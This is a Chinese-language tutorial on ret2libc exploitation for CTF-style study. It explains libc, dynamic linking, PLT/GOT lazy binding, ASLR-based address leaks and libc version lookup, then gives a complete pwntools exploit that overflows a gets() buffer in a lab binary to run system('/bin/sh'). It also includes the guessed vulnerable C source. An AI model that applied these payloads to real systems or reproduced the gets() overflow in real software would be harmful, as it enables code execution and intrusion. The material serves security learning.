## 1. libc 介绍

### 1.1 什么是 libc？

**glibc 和 libc 都是 Linux 下的 C 函数库。**

| 概念 | 说明 |
|------|------|
| **libc** | Linux 下的 ANSI C 函数库，包含 C 语言最基本的库函数 |
| **glibc** | Linux 下的 GNU C 函数库（GNU C Library），是 GNU 旗下的 C 标准库实现 |

### 1.2 历史演变

```
Linux 标准 C 库的演变：

  Linux libc（原始）──→ 逐渐不再维护
       │
       ▼
  glibc（GNU C Library）──→ 成为 Linux 的标准 C 库（使用最广泛）
       │
       ├── 其他实现：uclibc、klibc 等
       │
       └── 在 /lib 目录下的 .so 文件为 libc.so.6
```

### 1.3 ANSI C 函数库 vs glibc

- **ANSI C 函数库**：基本的 C 语言函数库，包含 C 语言最基本的库函数（如 `printf`、`malloc`、`strcpy` 等）
- **glibc**：在 ANSI C 的基础上扩展了大量 POSIX 标准函数、系统调用封装等

### 1.4 为什么 ret2libc 需要 libc？

ret2libc 攻击的核心就是**跳转到 libc 中的函数**（如 `system`、`execve`）来执行任意命令。因此理解 libc 的结构和加载机制是 ret2libc 的基础。

## 2. 动态链接与延迟绑定

### 2.1 静态链接 vs 动态链接

```
────────────────────────────────────────────────────────────
│                     静态链接                                │
│                                                            │
│  program1.o + lib.o ─→ 独立可执行文件（包含所有代码）         │
│  program2.o + lib.o ──→ 独立可执行文件（包含所有代码）         │
│                                                            │
│  缺点：每个可执行文件都包含一份 lib.o 的副本，浪费空间         │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│                     动态链接                                │
│                                                            │
│  program1.o ─→ 运行时加载 lib.o（共享）                     │
│  program2.o ──→ 运行时加载 lib.o（共享，已存在于内存）         │
│                                                            │
│  优点：节省内存和磁盘空间，库更新无需重新编译程序              │
└────────────────────────────────────────────────────────────┘
```

### 2.2 动态链接的过程

假设有两个程序 `program1.o` 和 `program2.o`，共用同一个库 `lib.o`：

```
步骤 1：运行 program1
  ├── 系统加载 program1.o
  ├── 发现 program1.o 依赖 lib.o
  ├── 加载 lib.o 到内存
  └── 完成链接，形成可执行程序

步骤 2：运行 program2
  ├── 系统加载 program2.o
  ├── 发现 program2.o 依赖 lib.o
  ├── lib.o 已经存在于内存中！
  ├── 将内存中已有的 lib.o 映射到 program2 的虚拟地址空间
  └── 完成链接（类似静态链接的过程），形成可执行程序
```

### 2.3 动态链接的问题

动态链接在程序启动时需要做大量的**符号查找**和**重定位**工作，这会显著增加程序的启动时间。

## 3. PLT 与 GOT 详解

### 3.1 延迟绑定（Lazy Binding）

**核心思想**：函数第一次被调用时才进行绑定（符号查找、重定位等），暂没用到的函数先不绑定。

```
传统动态链接：
  程序启动 → 绑定所有外部函数 → 启动慢

延迟绑定（PLT）：
  程序启动 → 只绑定必要的 → 启动快
  函数首次调用 → 此时才绑定 → 按需加载
```

### 3.2 PLT 与 GOT 的关系

PLT（Procedure Linkage Table）将 GOT（Global Offset Table）拆分成了两个表：

| 表 | 全称 | 用途 |
|----|------|------|
| **.got** | Global Offset Table | 保存**全局变量**引用的地址 |
| **.got.plt** | GOT for PLT | 保存**函数引用**的地址，所有外部函数的引用都分离到这里 |

### 3.3 函数调用流程（延迟绑定）

```
第一次调用 puts("hello")：

  call puts@plt
       │
       ▼
  PLT 条目（puts@plt）
       │
       ├── 跳转到 .got.plt 中 puts 对应的条目
       │     （此时 .got.plt 中存储的是 PLT 中下一条指令的地址）
       │
       ▼
  动态链接器（ld.so）介入
       │
       ├── 查找 puts 在 libc 中的真实地址
       ├── 将真实地址写入 .got.plt
       │
       ▼
  跳转到 puts 的真实地址执行

第二次调用 puts("world")：

  call puts@plt
       │
       ▼
  PLT 条目（puts@plt）
       │
       ▼
  .got.plt 中已经是 puts 的真实地址
       │
       ▼
  直接跳转到 puts，无需再次查找
```

### 3.4 GDB 调试示例

```
pwndbg> telescope 0x804A014

00:0000  0x804a014 (puts@got.plt) ──→ 0xf7d51c30 (puts) ← endbr32
01:0004  0x804a018 (__gmon_start__@got.plt) ──→ 0x0804aace (__gmon_start__@plt+6) ← pus
02:0008  0x804a01c (__libc_start_main@got.plt) ──→ 0xf7c1edf0 (__libc_start_main) ← endbr32
03:000c  0x804a020 (__isoc99_scanf@got.plt) ──→ 0xf7d153a0 (__isoc99_scanf) ← endbr32
```

**关键观察**：
- `puts@got.plt` 已经指向了 libc 中 `puts` 的真实地址 `0xf7d51c30`
- `__libc_start_main@got.plt` 指向 `0xf7c1edf0`
- 这些地址每次运行都会变化（ASLR）

### 3.5 PLT/GOT 在 ret2libc 中的意义

```
┌─────────────────────────────────────────────────────────────┐
│  攻击者的视角：                                                │
│                                                             │
│  1. PLT 中的地址是固定的（程序编译时就确定了）                  │
│     → 可以直接调用 elf.plt['puts'] 等函数                     │
│                                                             │
│  2. GOT 中的地址是运行时确定的（动态链接后写入）                │
│     → 泄露 GOT 内容 = 泄露 libc 中函数的真实地址               │
│                                                             │
│  3. 知道了 libc 中某个函数的真实地址                           │
│     → 可以计算出 libc 基地址                                  │
│     → 进而计算出 system、/bin/sh 等所有地址                    │
└─────────────────────────────────────────────────────────────┘
```

## 4. 函数地址的查找（ASLR 与泄露）

### 4.1 ASLR（地址空间布局随机化）

- 由于 ASLR 机制，**函数在每次加载时地址都是不一样的**
- 但 ASLR 时**最后 12bit 是不变的**（页内偏移固定）

```
同一 libc 的不同加载：

  第1次：puts 地址 = 0xf7d51c30
  第2次：puts 地址 = 0xf7a31c30
  第3次：puts 地址 = 0xf7e11c30

  注意：末 12bit（c30）始终不变！
```

### 4.2 泄露原理

```
已知条件：
  ├── 泄露了某个函数（如 puts）的真实地址：leaked_puts_addr
  ├── 已知该函数在 libc 中的偏移：libc.sym['puts']
  │
  计算：
  ├── libc_base = leaked_puts_addr - libc.sym['puts']
  ├── system_addr = libc_base + libc.sym['system']
  └── binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
```

### 4.3 泄露哪个函数？

> **因为延迟绑定机制，我们需要泄露一个已经调用过的函数的 GOT 地址。**

- 未调用过的函数，其 GOT 条目中存储的是 PLT 桩代码地址，而非 libc 真实地址
- 已调用过的函数，GOT 条目已被动态链接器更新为真实地址

```
泄露流程：

  1. 程序先调用 puts（触发延迟绑定，GOT 被填充）
  2. 利用漏洞读取 puts@got 的内容
  3. 得到 puts 在 libc 中的真实地址
  4. 计算 libc 基地址和其他函数地址
```

## 5. libc 版本查询

### 5.1 为什么需要查询 libc 版本？

远程攻击时，我们**不知道目标系统使用的 libc 版本**。不同版本的 libc 中，`system`、`/bin/sh` 等符号的偏移不同，必须确定版本才能正确计算地址。

### 5.2 查询方法

**一般做法**：泄露出某个函数的地址，然后通过对比这个函数地址的**末 12bit 与函数名**，来暴力查询出对应的 libc 版本。

### 5.3 常用查询工具

| 工具 | 说明 |
|------|------|
| [libc.blukat.me](https://libc.blukat.me/) | 在线查询，输入函数名和地址末位即可匹配 |
| **LibcSearcher** | Python 工具，自动化查询 libc 版本 |
| **DynELF** | pwntools 内置模块，通过多次泄露动态解析符号 |

### 5.4 LibcSearcher 使用示例

```python
from LibcSearcher import *

# 泄露 puts 的真实地址
leaked_puts = 0xf7d51c30

# 查询 libc 版本
obj = LibcSearcher('puts', leaked_puts)

# 获取 libc 基地址
libc_base = leaked_puts - obj.dump('puts')

# 计算 system 和 /bin/sh 地址
system_addr = libc_base + obj.dump('system')
binsh_addr = libc_base + obj.dump('str_bin_sh')
```

### 5.5 DynELF 使用示例

```python
from pwn import *

def leak(address):
    # 构造 payload 泄露 address 处的内容
    payload = b'A' * offset + p32(puts_plt) + p32(main) + p32(address)
    s.sendline(payload)
    s.recvuntil("...\n")
    data = s.recv(4)
    return data

# 使用 DynELF 自动查找 system 地址
d = DynELF(leak, elf=ELF("./binary"))
system_addr = d.lookup('system', 'libc')
```

## 6. 完整利用链：从泄露到 getshell

### 6.1 场景描述

程序存在栈溢出，有 `puts` 函数可以泄露地址，但**没有 `system` 函数和 `/bin/sh` 字符串**。我们拥有对应的 `libc.so.6` 文件。

### 6.2 攻击流程

```
第一阶段：泄露 libc 地址
  │
  ├── 构造 payload：调用 puts(puts@got) 泄露 puts 真实地址
  ├── 程序返回 main（为了第二次利用）
  │
  ▼
第二阶段：计算关键地址
  │
  ├── libc_base = leaked_puts - libc.sym['puts']
  ├── system_addr = libc_base + libc.sym['system']
  ├── binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
  │
  ▼
第三阶段：执行 system("/bin/sh")
  │
  ├── 构造 payload：调用 system(binsh_addr)
  └── 获得 shell！
```

### 6.3 完整 Exploit 代码

```python
from pwn import *

s = process("./ret2libc2")

# ── 第一阶段：泄露 puts 地址 ──

s.recvuntil('The address of function "puts" is ')
libc = ELF("./libc.so.6")

tmp = int(s.recv(10), 16)          # 接收程序输出的 puts 地址（16进制字符串）
success(hex(tmp))                   # 打印泄露的地址

# ── 第二阶段：计算 libc 基地址和关键函数地址 ──

libc.address = tmp - libc.sym['puts']   # 设置 libc 基地址
gdb.attach(s, "b *0x08048549\n c")      # 附加调试器

system = libc.sym['system']             # system 的真实地址
sh = next(libc.search(b'/bin/sh'))      # /bin/sh 的真实地址
success(hex(system))
success(hex(sh))

# ── 第三阶段：执行 system("/bin/sh") ──

payload = b'A' * 32 + p32(system) + p32(0) + p32(sh)
#               ↑ 偏移32     ↑ system地址  ↑ fake_ret  ↑ /bin/sh地址

raw_input(">")       # 暂停，等待附加 GDB
s.sendline(payload)

s.interactive()      # 进入交互 shell
```

### 6.4 代码逐步解析

```python
# 第1步：接收程序主动泄露的 puts 地址
s.recvuntil('The address of function "puts" is ')
# 程序输出类似：The address of function "puts" is 0xf7d51c30

# 第2步：解析地址
tmp = int(s.recv(10), 16)
# recv(10) 接收 "0xf7d51c30"（10个字符）
# int(..., 16) 将十六进制字符串转为整数

# 第3步：设置 libc 基地址
libc.address = tmp - libc.sym['puts']
# libc.address 是 pwntools 的便捷属性
# 设置后，libc.sym['system'] 等会自动加上基地址

# 第4步：构造最终 payload
payload = b'A' * 32 + p32(system) + p32(0) + p32(sh)
# 栈布局：
#   [A * 32]        → 填充缓冲区
#   [system]        → 覆盖返回地址
#   [0]             → system 的返回地址（无所谓）
#   [sh]            → system 的参数 "/bin/sh"
```

### 6.5 程序源码推测

```c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buf[32];
    printf("The address of function \"puts\" is %p\n", puts);
    // 程序主动泄露了 puts 的地址！
    gets(buf);  // 栈溢出漏洞
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    vuln();
    return 0;
}
```

### 7.3 关键要点总结

| 要点 | 说明 |
|------|------|
| libc 是 ret2libc 的基础 | 所有跳转目标（system 等）都在 libc 中 |
| 动态链接使 libc 共享 | 多个程序共用同一份 libc，节省资源 |
| 延迟绑定加速启动 | 函数首次调用时才解析真实地址 |
| GOT 存储真实地址 | 泄露 GOT = 泄露 libc 函数地址 |
| ASLR 使地址随机化 | 但 libc 内部偏移固定，泄露一个即可推算全部 |
| 需要已调用过的函数 | 未调用的函数 GOT 条目未被填充 |
| libc 版本决定偏移 | 不同版本偏移不同，必须匹配正确版本 |
